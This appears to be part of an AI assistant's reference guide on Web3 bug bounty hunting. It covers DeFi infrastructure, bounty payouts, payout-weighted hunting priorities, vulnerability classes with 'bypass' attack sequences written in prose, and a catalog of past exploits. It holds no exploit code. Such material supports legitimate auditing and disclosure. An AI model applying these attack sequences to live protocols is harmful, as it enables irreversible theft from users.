## VIII.1 How Web3 infrastructure actually works (the terrain you attack)

You cannot hunt what you don't understand. This is the mental model.

**Blockchain & accounts.** A blockchain is a shared, append-only ledger replicated
across many nodes, agreed by consensus (Proof-of-Stake on Ethereum today). Two account
types: **EOAs** (externally owned accounts — a person with a private key) and
**contract accounts** (code + storage, no key; they act only when called). State =
every account's balance and storage.

**The EVM & contracts.** The Ethereum Virtual Machine executes contract **bytecode**.
Solidity/Vyper compile to it. A contract has **storage** (persistent, 32-byte slots —
*expensive*), **memory** (per-call scratch), and functions. Calls between contracts
are **message calls**; `delegatecall` runs *another* contract's code in *your* storage
(the basis of upgradeable proxies — and of the delegatecall bugs in §7). Code and
storage are **public and immutable** unless built upgradeable. *Everyone can read your
code and state.* There are no secrets on-chain.

**Transactions, gas, atomicity.** A transaction is a signed request from an EOA that
changes state. It costs **gas** (paid in the native token) proportional to computation/
storage. Crucially, a transaction is **atomic**: if any part reverts, the *entire*
transaction is rolled back (only gas is spent). This is why **flash loans** work
(borrow + use + repay in one tx, or it all reverts) and why **revert-on-loss** attacks
on randomness/arbitrage are free retries (§12).

**Mempool & ordering (MEV).** Submitted transactions sit in a **public mempool** before
inclusion. **Block builders/proposers** choose which to include and in what order, and
can insert their own. This ordering power is **MEV** (Maximal Extractable Value):
front-run, back-run, sandwich (§11). Private relays (Flashbots) hide txs from the
public mempool. *Your own exploit tx is visible in the mempool unless you use a private
relay — generalized front-runners will steal it.*

**Nodes & RPC.** You interact via **RPC endpoints** (Infura, Alchemy, public nodes).
For hunting, you **fork mainnet** locally (Foundry's `anvil --fork-url`, Hardhat) to
replay real state and test exploits for free against a copy of production.

**Tokens & standards.** **ERC-20** (fungible), **ERC-721/1155** (NFTs), **ERC-4626**
(tokenized vaults), **ERC-2612** (`permit` gasless approvals), **ERC-4337** (account
abstraction). Many tokens deviate (fee-on-transfer, rebasing, no return value, >18 or
<18 decimals, blocklists, hooks) — those deviations are a rich bug source (§10, §54).

**DeFi primitives (where the money and bugs are):**
- **AMM / DEX** (Uniswap, Curve, Balancer): liquidity pools price assets by a formula
  (`x*y=k` etc.). **Spot price is manipulable** by trading into a pool — the root of
  oracle attacks (§3). LP tokens represent pool shares; their valuation is a frequent
  bug (read-only reentrancy, §1).
- **Lending** (Aave, Compound): deposit collateral, borrow against it; **oracles**
  value collateral; under-collateralized positions get **liquidated**. Mispriced
  collateral → bad debt → insolvency (§3, §51).
- **Stablecoins:** maintain a peg via collateral/algorithm; depeg = systemic cascade.
- **Vaults/yield** (ERC-4626): deposit → shares; share-price math and **donation/first-
  depositor** inflation (§14) bite here.
- **Bridges:** lock on chain A, mint on chain B; the most-attacked, highest-value
  surface (§5).
- **Governance:** token-weighted voting over treasury/upgrades (§8).
- **Oracles** (Chainlink): push off-chain prices on-chain; integration mistakes
  (staleness, L2 sequencer, decimals) are common (§49).

**L2s / rollups (Arbitrum, Optimism, Base, zkSync).** Execute off-chain, post data/
proofs to Ethereum (L1). **Optimistic** rollups have a **fraud-proof challenge window**
(~7 days) and a **sequencer** (can censor/reorder, and if down, oracle feeds go stale —
§49). **ZK** rollups post validity proofs. L2-specific surface: sequencer trust, forced
inclusion, withdrawal delays, cross-domain message replay, data availability (§52).

**Composability ("money legos").** Protocols call each other freely. This is Web3's
superpower *and* its systemic risk: one protocol's bug (a manipulable `get_virtual_price`,
a Balancer pool rounding flaw) cascades into **every protocol that integrates it** —
why "out-of-scope dependency" bugs still drain in-scope funds, and why **Primacy of
Impact** (§VIII.2) matters to you.

---

## VIII.2 How Web3 bug bounty actually works (the economics & process)

This is the business you're in. Know it cold.

**Two distinct models — don't confuse them:**

1. **Live bug bounties (e.g. Immunefi, HackenProof, Hats, protocols' own programs).**
   You hunt **deployed, live** protocols. Pay-per-valid-bug. Rewards scale with
   severity and **funds at risk**. This is where the life-changing numbers are: crypto
   criticals routinely pay **five, six, even seven figures** because the alternative is
   the protocol losing tens or hundreds of millions.
   - **Severity & payout:** Immunefi uses its **Vulnerability Severity Classification
     System (V2.3)**. **Critical** smart-contract payouts are commonly **~10% of the
     funds directly at risk**, with a program-set **cap** and **floor** (floors like
     **$50k**, caps up to **$1M+** on big programs — some elite programs cap far
     higher). **High** is a program-set band (e.g. **$5k–$20k+**). Medium/Low are
     smaller flat tiers.
   - **Primacy of Impact (PoI):** many programs reward based on the **impact achieved**,
     *even if the specific asset/contract you routed through is out of scope* — because
     the protocol cares that funds *can* be drained, not which lego you used. If a
     program honors PoI, **chase impact, not the scope list.**
   - **Rules that cost you money if you ignore them:** if a contract is **upgradeable or
     pausable**, usually **only the "initial attack" counts** (they can patch, so no
     repeat rewards). **Known issues / prior-audit findings** are excluded. **PoC is
     usually mandatory** for Critical/High (a runnable fork test proving the drain).
     Many require **KYC** to pay, and **no mainnet exploitation** — prove it on a fork.

2. **Audit contests (Code4rena, Sherlock, Cantina, CodeHawks).** A sponsor funds a
   **fixed prize pool**; many "wardens" audit **pre-launch/updated** code for a set
   window; judges rank findings and **split the pool** by severity and uniqueness. Goal:
   keep bugs out of production *before* deploy. Trade-off vs bounties: the pool is
   **guaranteed to be paid out** (so your odds of *some* reward are better), but it's
   **shared and competitive**, and **duplicates dilute** your share. Great for building
   reputation and consistent income; bounties are the lottery-with-better-odds for the
   huge singles.

**The hunter's economic reality (internalize this):**
- **Severity × funds-at-risk = payout.** The same bug class pays wildly differently
  depending on TVL behind it. A reentrancy on a $5M protocol and a $500M protocol are
  the same skill, 100× the reward. **Hunt where the TVL is.**
- **Duplicates kill contest income;** **speed and uniqueness** win. In live bounties,
  **first valid report** wins — move fast once you have a provable PoC.
- **Acceptance friction is real:** no PoC, out-of-scope with no PoI, known issue,
  "theoretical with no realistic path," centralization/admin-key "risks" many programs
  explicitly **exclude** — all are **time you don't get paid for.** Read the program's
  **out-of-scope and known-issues list before you hunt.**
- **Report quality = payout multiplier.** A clean root-cause + runnable PoC + impact +
  fix often gets graded higher and paid faster than a vague "I think this is bad."

---

## VIII.3 The HUNTER'S PRIORITY LENS (what matters to *you*)

> **Core rule for Qarvis:** when ranking what to look at, weight by what pays the
> hunter, not by what merely worries the company. Prioritize:
>
> **Hunter-Priority = (Payout size) × (Acceptance likelihood) × (How often it actually
> appears) × (How provable it is)**

Apply this lens to every candidate bug:

**TIER S — drop everything, these are the paydays (hunt these first):**
- **Direct theft of funds / unauthorized withdrawal** (reentrancy incl. read-only,
  access-control on withdraw/mint, oracle+flashloan draining a lender, bridge
  signature/verification bypass, delegatecall takeover). *Huge payout, near-certain
  acceptance with PoC, appears constantly, provable on a fork.* This is the job.
- **Protocol insolvency / permanent fund freeze** (governance capture, proxy self-
  destruct, math that mints infinite tokens or zeroes debt).
- **Unbacked mint / infinite inflation** (overflow, broken invariant, signature replay
  of a mint).

**TIER A — strong, common, very payable:**
- **Theft/loss under specific-but-realistic conditions** (price manipulation needing
  some liquidity, liquidation logic abuse, vault share inflation on a fresh vault,
  reward/airdrop double-claim, cross-chain/signature replay).
- **Griefing that locks a *meaningful* amount of funds** (DoS on withdrawals,
  stuck auctions).

**TIER B — accepted but smaller / situational (do after S and A):**
- **Rounding/precision leaks** that bleed value slowly, **slippage/deadline** gaps,
  **front-runnable** actions with bounded profit, **gas griefing** without fund loss.

**TIER C — usually LOW payout or OUTRIGHT EXCLUDED (don't burn time unless asked):**
- **Centralization / admin-key / "the owner could rug" risks** — most programs
  **exclude** these as "accepted trust assumptions." Catastrophic for *users*, usually
  **$0 for the hunter.** Note it, don't chase it.
- **Theoretical issues with no realistic exploit path**, **best-practice/gas-
  optimization** nits, **missing events**, **compiler-version** style, **already-known/
  audited** findings, and **informational** severity. Companies may "care," but these
  **don't pay** — exactly the "critical for company, zero for hunter" case the operator
  flagged: **deprioritize.**

**Practical hunter heuristics:**
- **Follow the money and the TVL.** Biggest pools, biggest payouts.
- **Target new code and recent upgrades** — fresh deploys, post-audit changes, new
  integrations. (GMX July 2025: a *patch* for an earlier bug introduced the reentrancy
  that lost ~$42M. **Patches are prime hunting ground.**)
- **Read the audits that already happened** — then hunt what they *didn't* cover
  (out-of-scope dependencies under PoI, new code added after the audit, assumptions the
  audit stated).
- **Think in invariants and whole transactions**, fork-test everything, and ship the
  **first clean provable PoC** before someone else does.
- **Respect the rules** (§0.2, §VIII.2): fork PoCs only, never touch mainnet funds,
  disclose through the program. Breaking this forfeits the reward *and* your reputation
  — your most valuable asset in this field.

---

## VIII.4 Impact tri-view — company / user / hunter (apply to every Web3 bug)

For each bug, reason on three axes. The **hunter axis is the tiebreaker** for where to
spend time.

- **Company (protocol/DAO):** insolvency, drained treasury, dead token, shutdown,
  legal/regulatory heat, permanent reputation loss. Web3 adds a brutal twist: there's
  often **no insurance, no clawback, and the "company" may be a handful of pseudonymous
  devs** — a single critical can end the project in one block.
- **User:** **irreversible** loss of real money — no bank, no chargeback, no reset. A
  drained wallet or exploited deposit is simply *gone*. Also: depegged stablecoins
  wiping savings, worthless governance tokens, and (via bridges) losses cascading to
  users who never touched the buggy protocol. For users, Web3 impact is the most
  permanent in all of security.
- **Hunter (you):** does it **pay**, will it be **accepted**, is it **provable**, is it
  a **duplicate/known** issue? Tier S/A = go; Tier C = note and move on. Your time is
  the scarce asset; spend it on provable, payable impact.

---

## VIII.5 Additional & deeper Web3 vulnerability classes

Continuing the numbering (Part I covered §1–§16). Each class is tagged with its
**Hunter Tier** (§VIII.3) so Qarvis knows how hard to chase it. Format stays:
what → found → defenses → **bypasses** → tri-view impact.

---

### 47. Liquidation logic abuse & bad-debt creation  ·  **Hunter Tier: S/A**

**What it is.** Lending/perp protocols liquidate unhealthy positions, paying
liquidators a bonus. Flaws: **self-liquidation** for profit, liquidating at a
manipulated price, **bad debt** left when collateral < debt (socialized onto other
users/protocol), liquidation that can be **blocked** (DoS, so positions never close and
go bad), or a bonus that lets a liquidator extract more than the shortfall.

**How found.** Model the health-factor math and the liquidation path end to end. Ask:
can I push a position unhealthy *and* liquidate it myself in one tx (with a flash
loan)? Can I make the collateral mis-valued mid-liquidation (read-only reentrancy,
§1)? Can I block liquidation of *my* position (revert on receive, §13)? Does partial
liquidation round in my favor? Does the protocol handle a token that can't be
transferred (blocklist) during liquidation?

**Defenses.** Robust oracles (§49), caps on liquidation bonus, handle bad debt
explicitly, no external-call dependence that an attacker can revert, incentivize timely
liquidation, account for non-standard tokens.

**Bypasses.** Flash-loan the whole cycle (crash price → liquidate → profit → repay);
**read-only reentrancy** to misprice collateral during the liquidation call; grief the
liquidation (make transfers to your position revert) so the protocol accrues bad debt;
exploit rounding in partial-liquidation share math; use a fee-on-transfer/rebasing
collateral so accounting diverges (§51).

**Impact.** *Company:* insolvency and socialized bad debt that can cascade to a bank
run. *User:* lenders eat losses; borrowers get unfairly liquidated. *Hunter:* direct
fund-loss class with clear PoC on a fork — high, payable, common in every lending/perp
program.

---

### 48. Reward, interest & accrual manipulation (double-claim, snapshot)  ·  **Tier S/A**

**What it is.** Staking/yield/airdrop reward math that can be **claimed twice**, claimed
for time you didn't stake, inflated by depositing right before a snapshot and leaving
right after (**flash-stake**), or broken by updating accounting in the wrong order
(claim before vs after `updateReward`). Interest accrual that can be front-run or
compounded wrongly.

**How found.** Trace the reward formula and *when* balances/indices update relative to
the reward checkpoint. Can I enter → snapshot → claim → exit atomically? Does claiming
reset the debt correctly, or can I re-enter and claim again (reentrancy via a reward
token with hooks)? Are rewards per-second bounded by actual stake duration?

**Defenses.** Checkpoint rewards on every balance change, accrue by elapsed time held,
block flash-stake (snapshot a past block / require minimum lock), reentrancy-guard
claim paths, correct order of `updateReward` before balance mutation.

**Bypasses.** Flash-loan a huge stake across a snapshot; claim-reentrancy through a
reward token's transfer hook; deposit/withdraw ordering to double-count; exploit an
index that doesn't update on transfer so transferred positions claim the same rewards.

**Impact.** *Company:* reward pool/treasury drained, token inflation. *User:* dilution,
pool emptied before they claim. *Hunter:* frequent in staking/farm code, provable,
pays well.

---

### 49. Oracle integration flaws (Chainlink staleness, L2 sequencer, decimals)  ·  **Tier A/S**

**What it is.** Even with a "good" oracle (Chainlink), the *integration* is often buggy:
not checking **staleness** (`updatedAt`/heartbeat) or round completeness
(`answeredInRound >= roundId`); ignoring **min/maxAnswer** circuit-breaker bounds (so a
real crash reads a floored price); **decimals mismatch** between feeds or between feed
and token (8 vs 18); not checking the **L2 sequencer-uptime feed** (on Arbitrum/
Optimism, if the sequencer is/was down, prices are stale and attackable); using a
single feed with no fallback; or trusting `latestAnswer` which lacks freshness data.

**How found.** Read every oracle read. Is `updatedAt` checked against a max age? Is a
negative/zero price rejected? Are decimals normalized? On L2, is the sequencer feed
checked with the grace period? Does the code assume 18 decimals when the feed is 8?

**Defenses.** Validate `updatedAt`, `answeredInRound`, non-zero/positive answer,
min/max bounds; normalize decimals; check L2 sequencer uptime + grace period; multiple
feeds + deviation checks.

**Bypasses (attacker view).** Trade against a **stale** price the protocol still trusts;
wait for or exploit **sequencer downtime** on L2; exploit a **decimals** error to value
collateral 10^10× off; push an asset past `minAnswer` so the protocol reads the floor,
not the real (lower) price, and over-lends.

**Impact.** *Company:* mispriced collateral → insolvency. *User:* liquidations at wrong
prices, bad debt. *Hunter:* extremely common (devs copy-paste Chainlink without the
checks), easy to spot in review, well-paid. **One of the highest ROI things to grep for.**

---

### 50. Vault share math — ERC-4626 inflation, donation & rounding  ·  **Tier A**

**What it is.** (Expands §14.) Tokenized vaults mint **shares** for deposits priced by
`totalAssets/totalShares`. Attacks: **first-depositor/inflation** (mint 1 wei share,
then *donate* assets directly to the vault to spike share price, so a victim's deposit
rounds to **0 shares** and the attacker redeems it); **rounding direction** that favors
the redeemer; **donation** to break any balance-based `totalAssets`; **cross-vault**
price confusion.

**How found.** Is `totalAssets` balance-based (so a direct transfer moves it)? Is there
a virtual-shares/offset or dead-shares mitigation? First deposit into an empty vault —
does rounding let me zero out the next depositor? Does the protocol reuse the inflated
share price as an oracle (read-only reentrancy, §1)?

**Defenses.** OpenZeppelin ERC-4626 **virtual shares/assets** offset, minimum/dead
initial deposit, round in the protocol's favor, track internal accounting instead of
raw balance, don't price shares off raw balances.

**Bypasses.** Target vaults deployed **without** the virtual-offset (many forks strip
it); front-run the first real depositor with the inflation sequence; donation to move
`totalAssets` even on "mitigated" vaults if any path reads raw balance.

**Impact.** *Company:* every depositor's funds at risk; share accounting is the vault's
whole premise. *User:* deposit → 0 shares → stolen. *Hunter:* classic, mechanical,
provable; appears in nearly every vault/yield fork.

---

### 51. Non-standard ERC-20 assumptions  ·  **Tier A/B**

**What it is.** Code that assumes every token behaves like a "nice" ERC-20 breaks on:
**fee-on-transfer** (received < sent → accounting overcounts), **rebasing** (balance
changes without a transfer), **no return value** (USDT — a naive `transfer` reverts or
silently passes), **non-18 decimals** (USDC=6, WBTC=8), **approval race** (ERC-20
`approve` front-running: change allowance 100→0→50 and a watcher spends 100+50),
**blocklist** tokens (USDC/USDT can freeze an address mid-flow), **double-entrypoint**
tokens, and **reentrant** tokens (ERC-777/callbacks, §1).

**How found.** List every token the protocol accepts (or *any* token for a permissionless
pool). For each assumption, find the code that breaks: does it measure actual received
balance? use `SafeERC20`? normalize decimals? handle a transfer that reverts due to
blocklist? guard against approval-race?

**Defenses.** `SafeERC20`; measure balance delta for fee/rebasing tokens; normalize
decimals; `increaseAllowance`/`decreaseAllowance` or approve-to-0 first; token
allowlist for sensitive protocols; reentrancy guards for callback tokens.

**Bypasses (attacker view).** Deposit a fee-on-transfer token into a protocol that
credits the *requested* amount → withdraw the difference; use a rebasing token to
desync accounting; exploit the approve-race to double-spend an allowance; deposit a
token, get blocklisted, and brick a shared withdrawal path (DoS, §13).

**Impact.** *Company:* accounting drift → slow or sudden insolvency, stuck funds.
*User:* losses, frozen withdrawals. *Hunter:* very common in permissionless/multi-token
protocols; mid-to-high payout depending on drain size.

---

### 52. L2 / rollup & cross-chain messaging bugs  ·  **Tier A/S**

**What it is.** Rollup- and messaging-specific flaws: **cross-domain message replay**
(a message consumable on multiple chains or more than once if nonce/chain-id not
bound); trusting `msg.sender` across a bridge without checking the **aliased** L1→L2
sender; **forced-inclusion / sequencer** assumptions; **withdrawal-finality** windows
(optimistic rollups' ~7-day challenge period — act before finality); **data
availability** failures; and L2 reorg/finality assumptions that don't hold.

**How found.** For every cross-chain message handler, check: is the source chain-id
bound? is there a consumed-nonce set? is the authorized sender verified *with address
aliasing*? can a message be replayed on another deployment? Are finality/challenge
windows respected before releasing funds?

**Defenses.** Bind chain-id + unique nonce + verifying contract into every message;
verify aliased cross-domain sender; respect challenge/finality windows; replay-protect;
validate the full message payload.

**Bypasses.** Replay a valid message on a sibling chain (missing chain-id); spoof the
cross-domain sender if aliasing isn't checked; exploit a withdrawal before the fraud
window closes if the protocol releases early.

**Impact.** *Company:* bridge/L2 contract drained or desynced. *User:* funds stuck or
stolen cross-chain. *Hunter:* high value (bridges/L2 hold huge TVL), fewer hunters
understand it → **less competition, big payouts.**

---

### 53. Account abstraction (ERC-4337) bugs  ·  **Tier A**

**What it is.** ERC-4337 smart-contract wallets separate **validation** from
**execution** via `UserOperation`s, an **EntryPoint**, **bundlers**, and **paymasters**
(who sponsor gas). New surface: **paymaster griefing/draining** (sponsor pays for ops
that revert or exploit refund logic), validation/execution-phase rule violations
(accessing banned opcodes/storage so bundlers get griefed), signature-aggregation bugs,
and wallet-init/`initCode` takeover.

**How found.** Review the wallet's `validateUserOp` and the paymaster's
`validatePaymasterUserOp`/`postOp`: can an op pass validation but grief execution? can
the paymaster be drained by ops that always revert after being sponsored? is the
userOp nonce/replay handled? can `initCode` be front-run to seize a counterfactual
wallet address?

**Defenses.** Follow ERC-4337 storage/opcode rules, bound paymaster exposure, validate
signatures and nonces correctly, protect counterfactual deployment.

**Bypasses.** Craft userOps that pass validation but waste/steal sponsored gas; abuse
`postOp` refund math; front-run `initCode` deployment; replay a userOp if nonce binding
is weak.

**Impact.** *Company:* paymaster/treasury drain, bundler DoS. *User:* wallet takeover or
funded-gas theft. *Hunter:* newer, fewer experts, growing TVL → good niche payouts.

---

### 54. Merkle airdrop & claim bugs  ·  **Tier A/B**

**What it is.** Airdrops/claims use a Merkle root; flaws let you **claim twice** (no
claimed-bitmap or resettable), **claim as someone else** (leaf not bound to
`msg.sender`), **front-run** a claim (claim isn't bound to the recipient so a watcher
submits your proof for themselves), or exploit **leaf malleability** / wrong encoding.

**How found.** Is the leaf `keccak(abi.encode(account, amount))` and is `account` forced
to `msg.sender` (or signature-bound)? Is there a per-leaf claimed flag set atomically?
Can the same proof be reused across epochs/roots? Is the proof front-runnable?

**Defenses.** Bind leaf to the caller, set claimed-status atomically before transfer,
unique root per campaign, standard double-hashed leaves to avoid second-preimage,
reentrancy-guard.

**Bypasses.** Reuse a proof if no claimed-flag; submit another user's `(account,amount)`
proof and redirect if the contract transfers to a param instead of `msg.sender`;
front-run a pending claim; second-preimage tricks on naive Merkle trees (intermediate
node passed as a leaf).

**Impact.** *Company:* airdrop pool drained, tokenomics wrecked. *User:* legit claimants
get nothing. *Hunter:* common around token launches, clean PoC, decent payout.

---

### 55. NFT-specific bugs  ·  **Tier A/B**

**What it is.** **Reentrancy via `_safeMint`/`safeTransferFrom`** (the `onERC721Received`/
`onERC1155Received` callback re-enters mint/claim — e.g. mint more than the per-wallet
cap by re-entering during the callback); **approval scams/`setApprovalForAll`** abuse;
**royalty bypass** (marketplaces/transfers that skip creator royalties); **metadata**
manipulation (mutable `tokenURI`, trait reveal front-running); missing access control
on `mint`; **signature-based mint** replay.

**How found.** Is `_safeMint` called **before** state (supply/minted-count) updates
(CEI violation, §1)? Can the receive callback re-enter the mint? Is per-wallet/supply
cap enforced against reentrancy? Are mint signatures replay-protected? Can metadata be
changed post-sale?

**Defenses.** CEI + reentrancy guard around mint, update counts before `_safeMint`,
replay-protect mint signatures, immutable/committed metadata, enforce caps atomically.

**Bypasses.** Re-enter `onERC721Received` to exceed caps or claim extra; replay a mint
signature; exploit mutable metadata; royalty-bypass transfer paths.

**Impact.** *Company:* mint economics broken, free/over-mints crater the collection.
*User:* dilution, scam approvals drain wallets. *Hunter:* common in NFT drops; payout
scales with mint value.

---

### 56. Precision loss, division-before-multiplication & invariant rounding  ·  **Tier B/A**

**What it is.** Integer math with the operations in the wrong order (`a/b*c` loses
precision vs `a*c/b`), rounding that consistently favors the user, or an **invariant**
(`x*y=k`, share price) that can be nudged by rounding across many small operations.
Balancer v2 (Nov 2025, ~$120M) combined an **access-control masquerade with a rounding
error that let the invariant be manipulated** — rounding is not always "just dust."

**How found.** Find every division; check order of operations and rounding direction;
ask "does this round in the protocol's favor or mine?" and "can I repeat the favorable
rounding many times (loop/flash-loan) to accumulate real value?" Check invariant
calculations for manipulability.

**Defenses.** Multiply before divide, round against the user, use fixed-point libs
(not hand-rolled), enforce invariants with explicit `require`s and minimum thresholds.

**Bypasses.** Loop a tiny favorable-rounding op thousands of times in one tx; combine
rounding with another flaw (Balancer) to break the pool invariant; exploit
`0`-rounding (deposit amounts that round your cost to 0 but your credit to >0).

**Impact.** *Company:* slow bleed or, combined, a big drain. *User:* value siphoned.
*Hunter:* needs care to prove real (not dust) impact — but when it compounds, pays big.

---

### 57. Gas griefing, return bombs & the 63/64 rule  ·  **Tier B**

**What it is.** DoS/griefing via gas mechanics: an unbounded loop or a callee that
**returns a huge payload** ("return bomb") to exhaust the caller's gas; the **63/64
rule** (a call forwards at most 63/64 of remaining gas, so a nested call can be starved
to fail while the outer tx succeeds — breaking `try/catch` assumptions); forcing
expensive storage writes on others; **block stuffing**.

**How found.** Loops over attacker-growable arrays; external calls whose return size is
attacker-controlled and copied to memory; `try/catch` that assumes the inner call got
enough gas; batch operations a single entry can brick.

**Defenses.** Bound/paginate iteration; cap or ignore returndata size
(`call` with fixed return, assembly `returndatacopy` limits); account for the 63/64 rule
when a sub-call *must* succeed; pull-over-push.

**Bypasses.** Grow the array; return a giant payload; starve a required sub-call via
63/64 so a "cannot fail" assumption fails; revert in a callback to block a batch (§13).

**Impact.** *Company/User:* frozen/blocked funds and functionality. *Hunter:* usually
medium unless it **locks real funds** — then it climbs; often excluded if "just DoS,"
so check the program.

---

### 58. Centralization, admin keys & upgrade/trust risks  ·  **Tier C (note, rarely paid)**

**What it is.** The owner/multisig/upgrader *could* rug: upgrade to malicious logic,
mint infinitely, pause withdrawals, change the oracle, drain via a privileged function.
Technically real, often **catastrophic for users** — but **most bounty programs
explicitly exclude** "admin could misbehave" as an **accepted trust assumption**.

**Hunter guidance.** This is the textbook "critical for users, **$0 for the hunter**"
case the operator flagged. **Note it, don't grind on it** — unless (a) the privileged
function is reachable **without** the trusted key (then it's an access-control bug,
Tier S, §2), (b) an upgrade **can be front-run/hijacked** (uninitialized proxy, §7 —
Tier S), or (c) the program specifically rewards decentralization/trust findings.

**Impact.** *Company:* reputational ("it's a rug risk"). *User:* total irreversible loss
if the key is abused/stolen — and stolen admin keys are a **top real-world cause** of
loss (DMM Bitcoin ~$300M, many Q1-2024 incidents). *Hunter:* usually informational/
excluded → **deprioritize** for payout, but flag for the report's completeness.

---

### 59. Weak commit-reveal, front-runnable init & create2/metamorphic tricks  ·  **Tier B/A**

**What it is.** Grab-bag of ordering/determinism bugs: **commit-reveal** schemes that
leak the secret or allow reveal front-running (§11); **front-runnable initialization**
(§2); **`create2` metamorphic contracts** (deploy, `selfdestruct`, redeploy *different*
code at the **same address** — so a contract you "trusted" by address changes its code);
**uninitialized storage pointers** (old Solidity) overwriting critical slots.

**How found.** Does a commit leak enough to act on? Can init be front-run? Does the
protocol trust a `create2` address assuming immutable code (metamorphic risk)? Any
old-compiler uninitialized-pointer patterns?

**Defenses.** Hide commits fully (salt + hash), guard init, don't trust `create2`
addresses as immutable code, modern compiler + explicit storage.

**Impact/Hunter.** Situational; metamorphic-trust bugs can be Tier S if they let you
swap trusted logic; most others mid-tier.

---

## VIII.6 Real-world Web3 exploit catalog (study these like scripture)

Each entry: **what broke → which class → impact**. Figures are from secondary post-mortems
and vary by source — **verify against the primary write-up before citing**. The pattern
is the point: *almost every one maps to a class above, and almost every one was a chain.*

**The foundational ones:**
- **The DAO — Jun 2016, ~3.6M ETH.** Reentrancy (§1). Caused the ETH/ETC hard fork.
  *Impact:* split a blockchain in two; the event that created the discipline.
- **Parity multisig — Jul 2017 (~$30M stolen) & Nov 2017 (~513K ETH frozen).**
  Unprotected initializer / library `selfdestruct` (§2, §7). *Impact:* half a million
  ETH **permanently frozen** — irreversible, no profit even to the attacker; thousands
  of users' funds gone.

**Oracle / flash-loan era:**
- **bZx — Feb 2020.** First prominent flash-loan **oracle manipulation** (§3, §4);
  single Kyber feed. *Impact:* proved "infinite capital for one tx" makes economic bugs
  practical — changed DeFi threat modeling permanently.
- **Harvest Finance — Oct 2020, ~$34M.** Flash-loan oracle manipulation of Curve pool
  pricing (§3). *Impact:* depositors drained; bank-run on the vault.
- **Beanstalk — Apr 2022, ~$182M.** **Governance** flash-loan capture (§8): ~$1B Aave
  flash loan → >67% votes → emergency proposal drained the treasury in one tx.
  *Impact:* protocol treasury gone instantly; the canonical governance-attack lesson.
- **Mango Markets — Oct 2022, ~$114M.** **Spot-price oracle** pump with own capital
  (§3) — no flash loan. *Impact:* protocol insolvent; later a landmark **criminal
  conviction** (attacker's "legal trading strategy" defense failed) — a marker that
  on-chain theft is prosecuted.

**Reentrancy, modern:**
- **CREAM Finance — Aug 2021, ~$18.8M (AMP).** Classic reentrancy via **ERC-777**
  callback (§1). *Impact:* lender drained.
- **Read-only reentrancy — dForce (Feb 2023, ~$3.7M), Conic (Jul 2023, ~$3.2M).**
  View-function-as-oracle poisoning (§1). *Impact:* showed "view functions are
  unguarded" is a top modern vector; several protocols patched pre-emptively.

**Bridges (the biggest numbers):**
- **Poly Network — Aug 2021, ~$611M (returned).** Arbitrary cross-contract call /
  keeper reassignment (§5). *Impact:* then-largest DeFi hack; funds returned, but proved
  bridges are the softest huge target.
- **Wormhole — Feb 2022, ~$326M.** **Signature-verification bypass** (§5, §6); 120k
  wETH minted unbacked. *Impact:* Jump Crypto backstopped it; wETH nearly depegged
  across chains.
- **Ronin — Mar 2022, ~$625M.** 4 validator keys phished + a **stale DAO delegation**
  for the 5th (§5; key-mgmt/governance, not code). *Impact:* Axie ecosystem gutted;
  attributed to the **Lazarus Group** — i.e. **nation-state funding**, a national-
  security dimension.
- **Nomad — Aug 2022, ~$190M.** Trusted Merkle root initialized to **zero** after an
  upgrade (§5). *Impact:* a **free-for-all** — hundreds copy-pasted the exploit;
  demonstrated how one bad init destroys all proofs.

**Recent (2024–2025) — study the freshest patterns:**
- **DMM Bitcoin — May 2024, ~$300M.** Likely **private-key compromise** (§58 trust/key
  mgmt). *Impact:* exchange collapse; keys, not code.
- **Bybit — Feb 2025, ~$1.4B (largest ever).** **Supply-chain attack on signing
  infrastructure** (§46-adjacent): signers tricked into approving malicious txs via
  compromised UI. *Impact:* CEX, not DeFi — but the lesson is that the **signing
  path/UI** is in scope; attributed to DPRK.
- **Cetus (Sui DEX) — May 2025, ~$223M.** **Integer overflow** via a flawed overflow
  check (§9). *Impact:* a reminder that math bugs still cause nine-figure losses on
  newer chains/VMs.
- **GMX — Jul 2025, ~$42M.** **Reentrancy introduced by a patch** for an earlier bug,
  enabling average-price manipulation (§1, §3). *Impact:* **patches are prime hunting
  ground** — the fix created the hole.
- **Balancer v2 — Nov 2025, ~$120M.** **Access-control masquerade + rounding/invariant
  manipulation** (§2, §56); composability spread damage to integrators. *Impact:*
  rounding "dust" + authz = nine figures, and **money-lego contagion** in action.

**Web2-of-Web3:**
- **Capital One — 2019, ~100M records (SSRF → cloud metadata).** Not on-chain, but the
  canonical **SSRF → IAM credential theft** (§20) that also haunts Web3 infra/dApps.

**Macro context (why this is the arena to hunt):** stolen-crypto totals hit roughly
**$2.2–3B in 2024** and **~$4B in 2025** (Chainalysis/PeckShield estimates). Top
real-world root causes: **private-key/signing compromise**, **access control**,
**reentrancy**, **oracle/price manipulation**, and **bad math** — and **personal-wallet
compromises** (phishing, malicious approvals, §15) have surged to a large share of all
losses. **DPRK-linked actors** account for a large fraction of Web3 theft — which is
exactly why finding these bugs first, as a white-hat, has stakes beyond the bounty.

---

## VIII.7 ✅ DONE WITH WEB3

Web3 coverage is now comprehensive: **§1–§16** (core critical→low) and **§47–§59**
(deeper/additional classes), plus the infrastructure model (§VIII.1), the bounty
economics (§VIII.2), the **hunter-first priority lens** (§VIII.3), the impact tri-view
(§VIII.4), and the real-world case catalog (§VIII.6). Every class carries detection,
defenses, **bypasses**, impact for company/user/hunter, and a hunter-priority tier.

**Web3 hunter's one-screen summary:**
1. **Hunt where the TVL is**, on **new code and recent patches**, reading **prior
   audits** to find what they missed.
2. **Tier S first:** direct theft, insolvency, unbacked mint, permanent freeze —
   reentrancy (incl. read-only), access control, oracle+flashloan, bridges, delegatecall,
   governance.
3. **Think invariants + whole transactions; fork-test; ship the first clean provable
   PoC.**
4. **Skip the unpaid stuff** (centralization/admin-key risk, theoretical, gas-nits) —
   note it, don't grind it.
5. **Rules are sacred:** fork PoCs only, never touch live funds, disclose through the
   program. Reputation is your real bankroll.

> **NEXT: web ("web4"/normal web) — the OWASP world.** Parts II and V already cover the
> web bug classes (SQLi, XSS, IDOR/access control, CSRF, SSRF, auth, RCE chains, SSTI,
> NoSQLi, prototype pollution, and more). The next expansion pass will add, in the same
> hunter-first style: an **OWASP Top 10 (2021 → current) walk-through**, a **web-specific
> bounty economics + hunter priority lens** (what pays on HackerOne/Bugcrowd vs what's
> N/A), **per-class real-world case catalog**, and deeper **chaining playbooks**. Say
> the word and I'll continue with web.

---
